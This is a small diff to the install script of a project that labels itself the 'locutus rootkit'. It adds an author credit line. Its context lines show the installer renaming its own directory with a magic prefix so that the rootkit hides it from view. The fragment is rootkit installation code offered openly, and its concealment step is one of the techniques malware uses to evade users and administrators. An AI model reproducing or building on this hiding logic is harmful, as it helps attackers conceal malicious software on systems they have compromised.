@@ -1,4 +1,5 @@
 #!/bin/bash
+echo "locutus rootkit by Terraminator (https://github.com/Terraminator)"
 echo "installing locutus..."
 mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden
 
